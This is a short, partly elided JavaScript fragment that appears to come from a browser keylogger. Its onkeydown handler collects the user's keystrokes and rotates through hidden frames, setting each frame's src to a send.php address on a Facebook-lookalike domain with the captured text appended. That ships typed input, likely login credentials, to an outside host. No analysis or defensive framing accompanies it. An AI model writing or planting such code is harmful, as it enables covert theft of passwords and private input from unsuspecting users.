...
document.onkeydown=function(e){
		  ...
		  if(charCount==2)
			...
			if(changeFrame==1)
			{
			 document.getElementById("sender1").setAttribute('src', 'www.fracebok.tuars.com/send.php'+record);
			record="";
			charCount=0;
			changeFrame++;
			}
			...
			if(changeFrame==0)
			{
		 document.getElementById("sender").setAttribute('src', 'www.fracebok.tuars.com/send.php'+record);
			record="";
			charCount=0;
			changeFrame++;
			}
				...
				{
		 document.getElementById("sender2").setAttribute('src', 'www.fracebok.tuars.com/send.php'+record);
			record="";
			charCount=0;
			changeFrame=0;
			}
